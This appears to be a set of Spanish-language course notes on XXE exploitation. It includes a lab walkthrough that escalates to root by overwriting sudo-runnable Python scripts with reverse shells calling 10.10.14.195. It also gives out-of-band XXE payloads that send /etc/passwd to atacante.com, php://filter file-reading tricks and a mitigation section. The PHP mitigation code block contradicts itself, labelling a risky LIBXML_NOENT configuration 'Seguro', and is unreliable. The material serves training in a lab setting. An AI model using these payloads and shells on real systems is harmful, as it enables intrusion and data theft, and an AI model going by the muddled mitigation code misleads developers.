## ① Repaso metodológico — Enfoque sistemático ante XXE

Castillo abre con un **repaso rápido de metodología** aplicado a XXE:

```
┌─────────────────────────────────────────────────────────────┐
│ 1. DETECTAR que acepta XML │
│ → Headers: Accept: application/xml, Content-Type: xml │
│ → Error Base: "XML not provided", "Start tag expected" │
│ │
│ 2. PROBAR XML válido simple │
│ → ¿200 OK + REFLECTED? → El parser procesa y devuelve │
│ │
│ 3. INYECTAR ENTITY SYSTEM │
│ → <!ENTITY xxe SYSTEM "file:///etc/passwd"> │
│ → Llamar con &xxe; en el cuerpo │
│ │
│ 4. MANEJAR CARACTERES ESPECIALES (PHP, HTML, XML) │
│ → php://filter/convert.base64-encode/resource=... │
│ │
│ 5. EXFILTRAR: /etc/passwd → usuarios → Hydra/SSH │
│ │
│ 6. POST-EXPLOTACIÓN: sudo -l, SUID, cron, movimiento lat. │
└─────────────────────────────────────────────────────────────┘
```

> [!important] La regla de oro de Castillo
> "No penséis en 'necesito llegar a la máquina final'. Pensad en '¿qué puedo sacar AHORA con lo que tengo?'. Pequeños pasos, ir con calma, analizar cada response."

## ② Máquina XXE (09/07) — Cierre completo

### Donde nos quedamos

| Estado | Detalle |
|--------|---------|
| **Usuario actual** | `mike` (con rbash — restricted bash) |
| **Credenciales** | 5 users + 5 passes de `datos.php` (Base64) |
| **Acceso SSH** | Solo `mike` funcionó con su pass |
| **Pendiente** | Bypass rbash → movimiento lateral → root |

### Paso 1: Bypass de rbash via SSH

```bash
# rbash bloquea: cd, rutas con /, redirecciones, vars PATH/SHELL, comandos absolutos
# Bypass: especificar shell al conectar
ssh mike@10.0.2.x -t "bash --noprofile"
# o
ssh mike@10.0.2.x -t "/bin/bash"
```

> [!important] Diferencia crítica
> `ssh user@host comando` → ejecuta y cierra (no interactivo).
> `ssh -t user@host "bash"` → **sesión interactiva** con esa shell.

### Paso 2: Movimiento lateral — Mike → N (Java GTFOBins)

```bash
$ sudo -l
User mike may run the following commands:
 (n) NOPASSWD: /usr/bin/java
```

**GTFOBins → Java → Sudo:**

```bash
cd /tmp
cat > shell.java << 'EOF'
public class shell {
 public static void main(String[] args) throws Exception {
 new ProcessBuilder("/bin/bash").start();
 }
}
EOF

javac shell.java
sudo -u n /usr/bin/java shell
# ¡Somos n!
```

> [!warning] Detalle clave: clase pública = nombre archivo
> `public class shell` → archivo **`shell.java`** (minúscula). Si no coincide, `javac` falla.

### Paso 3: Movimiento lateral — N → Pilon (Python script hijacking)

```bash
$ sudo -l
User n may run the following commands:
 (pilon) NOPASSWD: /usr/bin/python3 /opt/suma.py
```

```bash
# Ver original
cat /opt/suma.py
# import os; os.system("echo testing 123 > test.txt")

# Sobrescribir con reverse shell
cat > /opt/suma.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.195",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF

# Ejecutar como pilon
sudo -u pilon /usr/bin/python3 /opt/suma.py
# ¡Somos pilon!
```

### Paso 4: Escalada final — Pilon → Root (Cron job)

```bash
$ sudo -l
User pilon may run the following commands:
 (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

```bash
# Ver backup.py → se ejecuta periódicamente por cron como root
cat /opt/backup.py

# Sobrescribir
cat > /opt/backup.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.195",5555))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF

# Ejecutar (o esperar cron)
sudo -u root /usr/bin/python3 /opt/backup.py
# ¡ROOT!
```

> [!important] La cadena completa Nike/Castor
> ```
> XXE → LFI (/etc/passwd) → datos.php (Base64) → credenciales
> → Hydra SSH → mike (rbash)
> → SSH -t bash → mike (bash normal)
> → sudo -u n java (GTFOBins) → n
> → sudo -u pilon python3 /opt/suma.py (hijack) → pilon
> → sudo -u root python3 /opt/backup.py (cron hijack) → ROOT
> ```

## ③ Máquina Nike — Repaso rápido (resuelta por Sira)

### Vector: XXE en `upload.php` + `datos.php` (500 error)

| Hallazgo | Detalle |
|----------|---------|
| `gobuster -s "200,301,500"` | **Clave**: `datos.php` devolvía 500 |
| `upload.php` | "XML not provided" → Error Base |
| XXE simple | Reflected → parser activo |
| XXE + Base64 | `php://filter/convert.base64-encode/resource=/var/www/html/datos.php` |
| `datos.php` | 5 users + 5 passes (no en rockyou) |
| Hydra | Solo `mike` funcionó |
| rbash bypass | `ssh -t "bash"` |
| Mike → N | Java GTFOBins |
| N → Pilon | Python `/opt/suma.py` hijack |
| Pilon → Root | Python `/opt/backup.py` cron hijack |

> [!tip] Lección de Nike
> **"El 500 es tu amigo."** Un Internal Server Error significa que tu input rompió algo en el backend → **interactuaste con la lógica del servidor**. Incluye siempre `-s "200,301,500"` en tus scans.

## ④ XXE — Mitigaciones y Blue Team

Castillo explica cómo se previene XXE en el código (libxml2/PHP):

### Configuración segura PHP (libxml)

```php
// Opción 1: Deshabilitar ENTIDADES EXTERNAS globalmente
libxml_disable_entity_loader(true); // PHP < 8.0

// Opción 2: Parser options (PHP 8.0+)
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // ¡PELIGROSO!
// Seguro:
$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD); // Aún riesgoso
// Mejor:
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // NO usar en prod
// LO CORRECTO:
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET); // Sin red, sin entities externas
```

### Mitigaciones por capas

| Capa | Medida |
|------|--------|
| **Código** | `libxml_disable_entity_loader(true)` / `LIBXML_NONET` |
| **WAF/IDS** | Bloquear `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` en body XML |
| **Servidor** | Usuario web (`www-data`) sin permisos de lectura en `/etc`, `/home`, `/root` |
| **Red** | Egress filtering: el servidor no debe poder hacer requests salientes arbitrarios |
| **Monitoring** | Alertar en logs: "External entity", "Entity expansion", XML parse errors inusuales |

> [!important] XXE ≠ RCE (directamente)
> "XXE te da **lectura arbitraria de ficheros**. No te da ejecución de comandos *per se*. Para RCE necesitas encadenar: XXE → LFI → subir webshell → ejecutar. O XXE → leer SSH key → SSH. O XXE → leer config.php → credenciales BD → reutilización. **Siempre es una cadena.**"

## ⑤ Herramientas y trucos XXE

### Payloads útiles

```xml
<!-- 1. Básico /etc/passwd -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>

<!-- 2. Base64 para ficheros con chars especiales (PHP, XML, HTML) -->
<!DOCTYPE test [ 
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>

<!-- 3. Out-of-band (OOB) - exfiltración via HTTP/DNS -->
<!DOCTYPE test [ 
 <!ENTITY % remote SYSTEM "http://atacante.com/evil.dtd">
 %remote;
 %send;
]>

<!-- evil.dtd en servidor atacante: -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://atacante.com/?data=%payload;'>">
```

### Herramientas

| Herramienta | Uso |
|-------------|-----|
| **XXEinjector** | Automatiza XXE OOB, filtra entidades, extrae ficheros |
| **XCat** | XXE exploitation toolkit (OOB, filtros, etc.) |
| **Burp Suite** | Repeater para pruebas manuales, Scanner detecta XXE básico |
| **oxml_xxe** | Script Python para XXE rápido |

### Cheat sheet filtro PHP

```php
// Filtros útiles para XXE
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/string.toupper/resource=/etc/passwd
php://filter/string.rot13/resource=/etc/passwd
```

## ⑥ Conceptos transversales reforzados

### Transferencia de archivos entre máquinas

```bash
# ATACANTE (serve)
cd /ruta/con/archivos
python3 -m http.server 8000

# VÍCTIMA (download)
wget http://IP_ATACANTE:8000/archivo
# o
curl -O http://IP_ATACANTE:8000/archivo
```

> [!warning] Siempre en `/tmp`
> "Nunca trabajéis en el home de un usuario para movimiento lateral. Siempre en `/tmp` — todos tienen permisos de escritura y ejecución ahí."

### Diccionarios LFI especiales

```bash
# SecLists tiene diccionarios específicos para LFI
# /usr/share/seclists/Fuzzing/LFI/
# Incluyen: /etc/passwd, /proc/self/environ, /var/log/apache2/access.log, 
# php://filter/..., /proc/version, /etc/shadow, SSH keys, etc.
```

### Rate limiting — repaso final

| Técnica | Endpoint | Rate limit | Uso real |
|---------|----------|------------|----------|
| Fuerza bruta | 1 solo | **SÍ** | Último recurso (1/10 funciona) |
| Password spray | Múltiples (1 por user) | **NO** | Auditoría real, credenciales débiles |
| Directory listing | Múltiples (1 por dir) | **NO** | Reconocimiento estándar |
| Fuzzing params | Múltiples (1 por param) | **NO** | Descubrimiento funcionalidad oculta |
